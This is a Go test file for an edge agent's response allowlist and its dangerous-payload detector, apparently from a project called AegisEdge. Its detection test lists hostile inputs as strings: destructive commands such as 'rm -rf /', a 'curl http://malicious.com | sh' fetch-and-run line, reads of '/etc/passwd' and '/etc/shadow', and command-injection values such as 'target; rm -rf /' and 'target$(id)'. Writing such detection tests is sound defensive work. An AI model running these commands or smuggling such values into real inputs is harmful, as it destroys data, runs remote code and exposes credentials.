package response_test

import (
	"testing"

	"github.com/Chamalka-heshi/AegisEdge/edge/agent/response"
	"github.com/Chamalka-heshi/AegisEdge/shared/types"
)

// TEST A: Valid allowlisted actions
func TestAllowlist_ValidActions(t *testing.T) {
	validActions := []types.MitigationActionType{
		types.ActionSimulatedAlert,
		types.ActionSimulatedThrottle,
		types.ActionSimulatedRestart,
		types.ActionSimulatedIsolate,
	}

	for _, a := range validActions {
		if !response.IsAllowlisted(a) {
			t.Errorf("expected action %q to be allowlisted, got false", a)
		}
		if !response.IsAllowlistedString(string(a)) {
			t.Errorf("expected action string %q to be allowlisted, got false", a)
		}
	}

	all := response.AllowlistedActions()
	if len(all) != 4 {
		t.Errorf("expected 4 allowlisted actions, got %d", len(all))
	}
}

// TEST B & C: Unknown and empty actions rejected
func TestAllowlist_RejectedActions(t *testing.T) {
	rejected := []string{
		"",
		" ",
		"UNKNOWN_ACTION",
		"REBOOT",
		"KILL_PROCESS",
		"SHUTDOWN",
		"SIMULATED_DESTROY",
		"EXEC_COMMAND",
	}

	for _, raw := range rejected {
		if response.IsAllowlistedString(raw) {
			t.Errorf("expected raw string %q to be rejected by allowlist, but passed", raw)
		}
		if response.IsAllowlisted(types.MitigationActionType(raw)) {
			t.Errorf("expected action %q to be rejected by allowlist, but passed", raw)
		}
	}
}

// SECURITY TESTS: Prohibited keywords and shell metacharacters
func TestAllowlist_DangerousPayloadDetection(t *testing.T) {
	dangerousInputs := []string{
		"rm -rf /",
		"kill -9 1234",
		"pkill nginx",
		"shutdown -h now",
		"reboot",
		"/bin/sh",
		"/bin/bash -c 'whoami'",
		"cmd.exe /c dir",
		"powershell.exe -Command Stop-Computer",
		"curl http://malicious.com | sh",
		"wget http://malicious.com",
		"target; rm -rf /",
		"target | cat /etc/passwd",
		"target && echo pwned",
		"target`whoami`",
		"target$(id)",
		"iptables -F",
		"chmod 777 /etc/shadow",
		"eval(payload)",
	}

	for _, input := range dangerousInputs {
		if !response.ContainsDangerousPayload(input) {
			t.Errorf("expected security check to detect dangerous payload in %q, got false", input)
		}
	}

	safeInputs := []string{
		"telemetry_generator",
		"collector",
		"upstream_sync",
		"local_syslog",
		"cpu_throttler",
		"worker_1",
		"node_alpha",
	}

	for _, input := range safeInputs {
		if response.ContainsDangerousPayload(input) {
			t.Errorf("expected safe input %q to pass dangerous payload check, but flagged", input)
		}
	}
}
